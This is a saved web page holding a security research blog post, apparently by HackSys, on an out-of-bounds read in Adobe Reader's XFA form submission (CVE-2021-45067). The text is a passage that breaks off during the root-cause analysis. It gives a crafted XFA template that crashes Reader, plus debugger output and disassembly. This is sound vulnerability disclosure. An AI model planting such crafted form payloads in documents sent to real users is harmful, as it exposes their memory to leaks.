<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/569ce4b8f30dc480-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/d8804d28b3f5ce05-s.p.otf" as="font" crossorigin="" type="font/otf"/><link rel="stylesheet" href="/_next/static/css/4dfd5a5264424a0f.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/2a75dc013f3ed419.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-0fbc809f8b0c668c.js"/><script src="/_next/static/chunks/4bd1b696-a23cdecbdc66dd73.js" async=""></script><script src="/_next/static/chunks/1684-68d91d2ebad3f657.js" async=""></script><script src="/_next/static/chunks/main-app-188d9912fd0e5ccf.js" async=""></script><script src="/_next/static/chunks/6874-d043bc3669b11e48.js" async=""></script><script src="/_next/static/chunks/2848-76b38e6c317c0e54.js" async=""></script><script src="/_next/static/chunks/1966-a068e5746165fd6d.js" async=""></script><script src="/_next/static/chunks/2467-7c736c42c91fb3af.js" async=""></script><script src="/_next/static/chunks/214-845c2722ecb73b86.js" async=""></script><script src="/_next/static/chunks/app/layout-f709b6a7dd5adbfc.js" async=""></script><script src="/_next/static/chunks/app/not-found-cbc74e2537bbd3aa.js" async=""></script><script src="/_next/static/chunks/d3ac728e-41fcba63e1ac6655.js" async=""></script><script src="/_next/static/chunks/e0368f7a-1235c34447e61195.js" async=""></script><script src="/_next/static/chunks/1456-5cbd6dd70e2edd95.js" async=""></script><script src="/_next/static/chunks/6877-676b4dd2ee485b26.js" async=""></script><script src="/_next/static/chunks/7882-5f5fc3a912ab1310.js" async=""></script><script src="/_next/static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js" async=""></script><link rel="preload" href="/_next/static/css/09dfadb69bdaa005.css" as="style"/><link rel="preload" href="/_next/static/css/06fcfbe31f4b8e82.css" as="style"/><meta name="next-size-adjust" content=""/><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col"><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/webpack-0fbc809f8b0c668c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:\"$Sreact.suspense\"\n3:I[75989,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"GoogleAnalytics\"]\n4:I[29093,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"PageLoadWrapper\"]\n5:I[2148,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"Header\"]\n6:I[87555,[],\"\"]\n7:I[31295,[],\"\"]\n8:I[32876,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"4345\",\"static/chunks/app/not-found-cbc74e2537bbd3aa.js\"],\"default\"]\n9:I[6874,[\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"2467\",\"static/chunks/2467-7c736c42c91fb3af.js\",\"214\",\"static/chunks/214-845c2722ecb73b86.js\",\"7177\",\"static/chunks/app/layout-f709b6a7dd5adbfc.js\"],\"\"]\nc:I[59665,[],\"MetadataBoundary\"]\ne:I[59665,[],\"OutletBoundary\"]\n11:I[74911,[],\"AsyncMetadataOutlet\"]\n13:I[59665,[],\"ViewportBoundary\"]\n15:I[26614,[],\"\"]\n:HL[\"/_next/static/media/569ce4b8f30dc480-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/93f479601ee12b01-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/d8804d28b3f5ce05-s.p.otf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/otf\"}]\n:HL[\"/_next/static/css/4dfd5a5264424a0f.css\",\"style\"]\n:HL[\"/_next/static/css/2a75"])</script><script>self.__next_f.push([1,"dc013f3ed419.css\",\"style\"]\n:HL[\"/_next/static/css/09dfadb69bdaa005.css\",\"style\"]\n:HL[\"/_next/static/css/06fcfbe31f4b8e82.css\",\"style\"]\na:T4ef,M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"gMyW5qIY4BG4upgCzpuGJ\",\"p\":\"\",\"c\":[\"\",\"blogs\",\"adobe-reader-xfa-ansi-unicode-confusion-information-leak\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"blogs\",{\"children\":[[\"slug\",\"adobe-reader-xfa-ansi-unicode-confusion-information-leak\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/4dfd5a5264424a0f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2a75dc013f3ed419.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L3\",null,{}]}]}],[\"$\",\"body\",null,{\"className\":\"__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col\",\"children\":[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L4\",null,{\"children\":[[\"$\",\"$L5\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex-grow container mx-auto pt-24 pb-20\",\"children\":[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"$L8\",null,{}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"footer\",null,{\"className\":\"fixed left-0 bottom-0 right-0 border-t border-primary/30 bg-background/95 backdrop-blur-sm py-2 px-2 sm:px-4 w-full z-10 print:relative\",\"children\":[\"$\",\"div\",null,{\"className\":\"container mx-auto px-0\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex items-center justify-between w-full\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex-1\",\"children\":[\"$\",\"div\",null,{\"className\":\"text-xs sm:text-sm font-semibold bg-gradient-to-r from-primary/90 to-secondary/90 bg-clip-text text-transparent truncate\",\"children\":[\"© \",2025,\" \",\"HackSys Inc\"]}]}],[\"$\",\"div\",null,{\"className\":\"flex items-center gap-3 sm:gap-4 ml-4\",\"children\":[[\"$\",\"$L9\",null,{\"href\":\"https://twitter.com/HackSysTeam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Twitter\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"X\"}],[\"$\",\"path\",null,{\"d\":\"M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://github.com/hacksysteam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"GitHub\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"GitHub\"}],[\"$\",\"path\",null,{\"d\":\"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://www.facebook.com/HackSysTeam\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Facebook\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"Facebook\"}],[\"$\",\"path\",null,{\"d\":\"M9.101 23.691v-7.98H6.627v-3.667h2.474v-1.58c0-4.085 1.848-5.978 5.858-5.978.401 0 .955.042 1.468.103a8.68 8.68 0 0 1 1.141.195v3.325a8.623 8.623 0 0 0-.653-.036 26.805 26.805 0 0 0-.733-.009c-.707 0-1.259.096-1.675.309a1.686 1.686 0 0 0-.679.622c-.258.42-.374.995-.374 1.752v1.297h3.919l-.386 2.103-.287 1.564h-3.246v8.245C19.396 23.238 24 18.179 24 12.044c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.628 3.874 10.35 9.101 11.647Z\"}]]}]}],[\"$\",\"$L9\",null,{\"href\":\"https://discord.com/invite/ns32uNhaq7\",\"className\":\"text-muted-foreground hover:text-primary transition-all duration-200\",\"aria-label\":\"Discord\",\"children\":[\"$\",\"svg\",null,{\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"16\",\"height\":\"16\",\"className\":\"sm:w-[18px] sm:h-[18px]\",\"viewBox\":\"0 0 24 24\",\"fill\":\"currentColor\",\"role\":\"img\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"title\",null,{\"children\":\"Discord\"}],[\"$\",\"path\",null,{\"d\":\"$a\"}]]}]}]]}]]}]}]}]]}]}]}]]}]]}],{\"children\":[\"blogs\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"adobe-reader-xfa-ansi-unicode-confusion-information-leak\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$Lb\",[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/09dfadb69bdaa005.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/06fcfbe31f4b8e82.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$Le\",null,{\"children\":[\"$Lf\",\"$L10\",[\"$\",\"$L11\",null,{\"promise\":\"$@12\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"6kr8cIBHiWPJLp4aoLX9J\",{\"children\":[[\"$\",\"$L13\",null,{\"children\":\"$L14\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$15\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"16:I[74911,[],\"AsyncMetadata\"]\n18:I[88793,[\"7330\",\"static/chunks/d3ac728e-41fcba63e1ac6655.js\",\"5661\",\"static/chunks/e0368f7a-1235c34447e61195.js\",\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"1456\",\"static/chunks/1456-5cbd6dd70e2edd95.js\",\"6877\",\"static/chunks/6877-676b4dd2ee485b26.js\",\"7882\",\"static/chunks/7882-5f5fc3a912ab1310.js\",\"3744\",\"static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js\"],\"HeroSection\"]\n19:I[750,[\"7330\",\"static/chunks/d3ac728e-41fcba63e1ac6655.js\",\"5661\",\"static/chunks/e0368f7a-1235c34447e61195.js\",\"6874\",\"static/chunks/6874-d043bc3669b11e48.js\",\"2848\",\"static/chunks/2848-76b38e6c317c0e54.js\",\"1966\",\"static/chunks/1966-a068e5746165fd6d.js\",\"1456\",\"static/chunks/1456-5cbd6dd70e2edd95.js\",\"6877\",\"static/chunks/6877-676b4dd2ee485b26.js\",\"7882\",\"static/chunks/7882-5f5fc3a912ab1310.js\",\"3744\",\"static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js\"],\"default\"]\nd:[\"$\",\"$2\",null,{\"fallback\":null,\"children\":[\"$\",\"$L16\",null,{\"promise\":\"$@17\"}]}]\n1a:T9248,"])</script><script>self.__next_f.push([1,"\n## Overview\n\nPDF readers are the most widely used software suites used by millions of people across the globe for reviewing and editing PDF files. Over the last 2 decades, adversaries have targeted popular PDF readers such as Adobe Acrobat Reader to compromise the security and privacy of users. Last year we spent a considerable amount of effort to assess such widely used PDF readers including **Adobe Acrobat**, **Foxit PDF Reader**, and **PDFium**. Multiple exploitable vulnerabilities were discovered and reported in **Adobe** and **Foxit PDF Reader**. In this blog post series, we will share insights into our bug-hunting process, vulnerability details, and exploitation methods.\n\nIn the first part of the series, we are sharing details about the first partially exploitable bug we found in Adobe Reader by fuzzing XFA. This bug was `Out of Bounds Read` caused by treating `ANSI` string as `Unicode` which we exploited to leak sensitive information from the sandboxed adobe reader process.\n\n## Background\n\n**Adobe XFA** (**XML Form Architecture**) provides functionality to support dynamic form manipulation inside adobe documents with the help of proprietary XML specification and javascript APIs. XFA allows us to dynamically manipulate PDF forms and layouts within PDF documents. Javascript APIs and XFA functionality had been the source of various memory corruption vulnerabilities (as well as logic bugs) in the past. After studying various sources of public reports on such vulnerabilities, we decided to get our hands dirty by fuzzing the javascript and XML parts. This was the first bug that we discovered shortly after we started developing and testing our internal fuzzer.\n\n## Advisory\n\n- [CVE-2021-45067](/advisories/HI-2021-002)\n\n## Testbed\n\n- Host OS: **Windows 10 Pro 20H2 19042.804**\n- Product: **Adobe Reader DC x64 2021.007.20095**\n- Product URL: \u003chttps://get.adobe.com/reader/otherversions/\u003e\n\n## Proof of Concept\n\nBelow given is a specially crafted **XML** inside a PDF document that crashes the **Adobe Reader** process.\n\n```xml\n\u003ctemplate\u003e\n    \u003csubform name=\"subform0\"\u003e\n        \u003cpageSet\u003e\n            \u003cpageArea\u003e\n                \u003ccontentArea /\u003e\n            \u003c/pageArea\u003e\n        \u003c/pageSet\u003e\n        \u003cfield\u003e\n            \u003cui\u003e\n                \u003ccheckButton /\u003e\n            \u003c/ui\u003e\n            \u003cvalue\u003e\n                \u003cfloat\u003e 1872560676325559.1 \u003c/float\u003e\n            \u003c/value\u003e\n        \u003c/field\u003e\n        \u003cfield id=\"clickMe\" name=\"clickMe\" w=\"4\" h=\"4\" x=\"4\" y=\"4\"\u003e\n            \u003cui\u003e\n                \u003cimageEdit /\u003e\n            \u003c/ui\u003e\n            \u003cevent activity=\"mouseUp\"\u003e\n                \u003csubmit format=\"formdata\" target=\"http://example.com/\" textEncoding=\"UTF-16\"\u003e\u003c/submit\u003e\n            \u003c/event\u003e\n        \u003c/field\u003e\n    \u003c/subform\u003e\n\u003c/template\u003e\n```\n\n## Crash State\n\n```\n(1884.2114): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nAcroForm!crash_sub_20A49980+0x137:\n00000000`61609ab7 8a01            mov     al,byte ptr [rcx] ds:0000016d`c8682000=??\n0:000\u003e r\nrax=00000000000015d0 rbx=0000016dc8681fe0 rcx=0000016dc8682000\nrdx=0000000000000020 rsi=0000003a97bfccb0 rdi=000000000000005f\nrip=0000000061609ab7 rsp=0000003a97bfc680 rbp=0000000000000000\n r8=00000000000000d0  r9=00007ffc68550000 r10=0000003a97bfc336\nr11=0000003a97bfc71c r12=000000000000ffff r13=0000003a97bfccb0\nr14=0000000000000000 r15=0000000000000001\niopl=0         nv up ei pl nz ac pe nc\ncs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212\nAcroForm!crash_sub_20A49980+0x137:\n00000000`61609ab7 8a01            mov     al,byte ptr [rcx] ds:0000016d`c8682000=??\n\n0:000\u003e dc @rcx\n0000016d`c8682000  ???????? ???????? ???????? ????????  ????????????????\n0000016d`c8682010  ???????? ???????? ???????? ????????  ????????????????\n0000016d`c8682020  ???????? ???????? ???????? ????????  ????????????????\n```\n\nWe can see the cause of the crash is due to the `rcx` register pointing to invalid memory. A quick check with `!heap` command showed us the memory address pointed by `rcx` is in fact in busy allocation with a user-allocated size of `0x16` bytes. This indicates that somehow adobe reader tried to read beyond the allocated buffer.\n\n## Heap Operation\n\n```\n0:000\u003e !heap -p -a @rcx\n    address 0000016dc8682000 found in\n    _DPH_HEAP_ROOT @ 16debbe1000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                             16dc7283340:      16dc8681fe0               16 -      16dc8681000             2000\n          unknown!printable\n    00007ffc6ad2867b ntdll!RtlDebugAllocateHeap+0x000000000000003b\n    00007ffc6ac5d255 ntdll!RtlpAllocateHeap+0x00000000000000f5\n    00007ffc6ac5b44d ntdll!RtlpAllocateHeapInternal+0x0000000000000a2d\n    00007ffc6855fde6 ucrtbase!_malloc_base+0x0000000000000036\n    000000006141d4c1 AcroForm!ASSureMalloc+0x0000000000000015\n    0000000061607899 AcroForm!string_alloc_copy_ret_addr_sub_20A477E4+0x00000000000000b5\n    00000000616099cc AcroForm!crash_sub_20A49980+0x000000000000004c\n    0000000061601a88 AcroForm!sub_20A41150+0x0000000000000938\n    000000006167f4e4 AcroForm!sub_20ABF354+0x0000000000000190\n    0000000061602372 AcroForm!ExportAsHtml+0x00000000000002d6\n    000000006161fff2 AcroForm!AFSubmitIt+0x0000000000001a1a\n    00000000617c9e5d AcroForm!sub_20C09860+0x00000000000005fd\n    0000000061afc027 AcroForm!SubmitDispatcher__dispatch+0x00000000000007d7\n    0000000061bcb1da AcroForm!sub_2100B170+0x000000000000006a\n    0000000061bcb96e AcroForm!XFAEventManager__eventOccurred+0x00000000000006fe\n    0000000061ae8948 AcroForm!XFAFormModelImpl__execEvent+0x00000000000001f4\n    0000000061ae8633 AcroForm!XFAFormModelImpl__eventOccurred+0x0000000000000083\n    0000000061ae8729 AcroForm!XFAFormModelImpl__eventOccurred_0+0x0000000000000095\n    000000006179ba56 AcroForm!piDocumentContext__eventOccurred+0x0000000000000162\n    000000006173bc5e AcroForm!sub_20B7B1F8+0x0000000000000a66\n    000000006173b1f2 AcroForm!sub_20B7B1C0+0x0000000000000032\n    00000000638c2b60 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083d950\n    00000000638c4df5 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083fbe5\n    00000000638c2c5a Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083da4a\n    00000000638c4ee3 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083fcd3\n    0000000063248250 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x00000000001c3040\n    00000000633eda0c Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x00000000003687fc\n    00000000631dfaeb Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000015a8db\n    00000000631e0068 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000015ae58\n    00000000631df8b0 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000015a6a0\n    000000006329ce57 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x0000000000217c47\n    00000000635c454a Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000053f33a\n```\n\n## Disassembly Around Crash\n\n```\n0:000\u003e ub @eip\nAcroForm!crash_sub_20A49980+0x119:\n00000000`61609a99 66413bc4        cmp     ax,r12w\n00000000`61609a9d 750c            jne     AcroForm!crash_sub_20A49980+0x12b (00000000`61609aab)\n00000000`61609a9f 488d0d0ae99c00  lea     rcx,[AcroForm!utf_16_K (00000000`61fd83b0)]\n00000000`61609aa6 e82150e1ff      call    AcroForm!CLazyAtom::operator unsigned short(void) (00000000`6141eacc)\n00000000`61609aab 488bcb          mov     rcx,rbx\n00000000`61609aae 66394644        cmp     word ptr [rsi+44h],ax\n00000000`61609ab2 7520            jne     AcroForm!crash_sub_20A49980+0x154 (00000000`61609ad4)\n00000000`61609ab4 418bd6          mov     edx,r14d\n```\n\nAfter quick checking of the backtrace and reversing the relevant context of the crash, we can see that the crash is happening while exporting form data as HTML during the processing of the form **submit event**.\n\n```\n0:000\u003e kc\n # Call Site\n00 AcroForm!crash_sub_20A49980\n01 AcroForm!sub_20A41150\n02 AcroForm!sub_20ABF354\n03 AcroForm!ExportAsHtml\n04 AcroForm!AFSubmitIt\n05 AcroForm!sub_20C09860\n06 AcroForm!SubmitDispatcher__dispatch\n07 AcroForm!sub_2100B170\n08 AcroForm!XFAEventManager__eventOccurred\n09 AcroForm!XFAFormModelImpl__execEvent\n0a AcroForm!XFAFormModelImpl__eventOccurred\n0b AcroForm!XFAFormModelImpl__eventOccurred_0\n0c AcroForm!piDocumentContext__eventOccurred\n0d AcroForm!sub_20B7B1F8\n0e AcroForm!sub_20B7B1C0\n0f Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x83d950\n```\n\nWithin adobe reader, various extended functionality is implemented using plugins. Javascript part is implemented in `EScript.api` where as XFA and other form-related javascript handlers are implemented in `AcroForm.api`. As we can see the crash happens inside `AcroForm.api` module, below is the module information for the vulnerable version of the `AcroForm.api`.\n\n## Module Version\n\n```\n0:000\u003e lmvm AcroForm\nBrowse full module list\nstart             end                 module name\n00000000`613c0000 00000000`62510000   AcroForm   (pdb symbols)          c:\\symbols\\Acroform.pdb\\83D2EC4EBDEC48278E9F0B0C633870092\\Acroform.pdb\n    Loaded symbol image file: C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\plug_ins\\AcroForm.api\n    Image path: C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\plug_ins\\AcroForm.api\n    Image name: AcroForm.api\n    Browse all global symbols  functions  data\n    Timestamp:        Fri Sep 24 21:14:39 2021 (614EA22F)\n    CheckSum:         01115197\n    ImageSize:        01150000\n    File version:     21.7.20095.60881\n    Product version:  21.7.20095.60881\n    File flags:       0 (Mask 3F)\n    File OS:          4 Unknown Win32\n    File type:        2.0 Dll\n    File date:        00000000.00000000\n    Translations:     0409.04b0\n    Information from resource tables:\n        CompanyName:      Adobe Systems Incorporated\n        ProductName:      Adobe Acrobat Forms\n        InternalName:     AcroForm\n        OriginalFilename: AcroForm.api\n        ProductVersion:   21.7.20095.454097\n        FileVersion:      21.7.20095.454097\n        FileDescription:  Adobe Acrobat Forms Plug-In\n        LegalCopyright:   Copyright 1984-2021 Adobe Systems Incorporated and its licensors. All rights reserved.\n        LegalTrademarks:  Adobe, Acrobat and the Acrobat logo are trademarks of Adobe Systems Incorporated which may be registered in certain jurisdictions.\n        Comments:         The Acrobat Forms plug-in allows users to create dynamic electronic forms for fill-in and transmittal.\n```\n\n## Root Cause Analysis\n\nThe crash occurs while dereferencing `rcx` register while executing `mov al, byte ptr [rcx]` instruction. Let's check the value of `rcx`.\n\n```\n0:000\u003e r @rcx\nrcx=0000016dc8682000\n\n0:000\u003e dc @rcx-20\n0000016d`c8681fe0  37382c31 36352c32 37362c30 32332c36  1,872,560,676,32\n0000016d`c8681ff0  35352c35 d0d00039 d0d0d0d0 d0d0d0d0  5,559...........\n0000016d`c8682000  ???????? ???????? ???????? ????????  ????????????????\n0000016d`c8682010  ???????? ???????? ???????? ????????  ????????????????\n0000016d`c8682020  ???????? ???????? ???????? ????????  ????????????????\n0000016d`c8682030  ???????? ???????? ???????? ????????  ????????????????\n0000016d`c8682040  ???????? ???????? ???????? ????????  ????????????????\n0000016d`c8682050  ???????? ???????? ???????? ????????  ????????????????\n```\n\nLet's see the faulting **XFA XDP** packet.\n\n```xml\n\u003ctemplate\u003e\n    \u003csubform name=\"subform0\"\u003e\n        \u003cpageSet\u003e\n            \u003cpageArea\u003e\n                \u003ccontentArea /\u003e\n            \u003c/pageArea\u003e\n        \u003c/pageSet\u003e\n        \u003cfield\u003e\n            \u003cui\u003e\n                \u003ccheckButton /\u003e\n            \u003c/ui\u003e\n            